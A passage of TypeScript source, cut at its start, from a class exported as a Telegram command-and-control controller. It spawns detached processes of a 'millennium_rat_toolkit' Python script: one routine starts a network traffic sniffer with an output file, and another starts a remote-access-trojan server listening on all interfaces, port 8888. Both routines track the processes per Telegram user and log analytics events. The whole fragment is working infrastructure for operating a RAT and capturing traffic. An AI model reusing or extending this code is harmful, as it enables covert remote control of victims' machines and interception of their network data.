                '--duration', duration || '300',
                '--output', outputFile || 'captured_traffic.json'
            ];

            const snifferProcess = spawn(snifferCommand[0], snifferCommand.slice(1), {
                detached: true,
                stdio: ['ignore', 'pipe', 'pipe']
            });

            if (!snifferProcess) {
                console.error("Failed to start sniffer process.");
                return;
            }

            this.snifferProcesses.set(userId, snifferProcess);

            snifferProcess.on('exit', (code) => {
                console.log(`Sniffer process exited with code ${code}`);
                this.snifferProcesses.delete(userId);
            });

            snifferProcess.stdout?.on('data', (data) => {
                console.log(`Sniffer Output: ${data}`);
            });

            snifferProcess.stderr?.on('data', (data) => {
                console.error(`Sniffer Errors: ${data}`);
            });

            // Analytics
            await storage.logAnalyticsEvent({
                metric: 'millennium_sniffer_start',
                value: JSON.stringify({
                    networkInterface,
                    duration,
                    outputFile,
                    pid: snifferProcess.pid,
                    timestamp: new Date().toISOString(),
                    userId
                })
            });

            return snifferProcess.pid;

        } catch (error) {
            console.error("Error executing sniffer command:", error);
            throw error;
        }
    }

    async executeServerCommand(userId: number, { port, networkInterface }: any) {
        try {
            const user = await storage.findTelegramUser(userId);
            if (!user) {
                console.warn(`User not found: ${userId}`);
                return;
            }

            const serverCommand = [
                'python3',
                'python_tools/millennium_rat_toolkit.py',
                '--start-server',
                '--port', port || '8888',
                '--interface', networkInterface || '0.0.0.0'
            ];

            const serverProcess = spawn(serverCommand[0], serverCommand.slice(1), {
                detached: true,
                stdio: ['ignore', 'pipe', 'pipe']
            });

            if (!serverProcess) {
                console.error("Failed to start server process.");
                return;
            }

            this.snifferProcesses.set(userId, serverProcess);

            serverProcess.on('exit', (code) => {
                console.log(`Server process exited with code ${code}`);
                this.snifferProcesses.delete(userId);
            });

            serverProcess.stdout?.on('data', (data) => {
                console.log(`Server Output: ${data}`);
            });

            serverProcess.stderr?.on('data', (data) => {
                console.error(`Server Errors: ${data}`);
            });

            // Analytics
            await storage.logAnalyticsEvent({
                metric: 'millennium_server_start',
                value: JSON.stringify({
                    port,
                    networkInterface,
                    pid: serverProcess.pid,
                    timestamp: new Date().toISOString(),
                    userId
                })
            });

            return serverProcess.pid;

        } catch (error) {
            console.error("Error executing server command:", error);
            throw error;
        }
    }
}

export { TelegramC2Controller, BotUser, ToolExecution };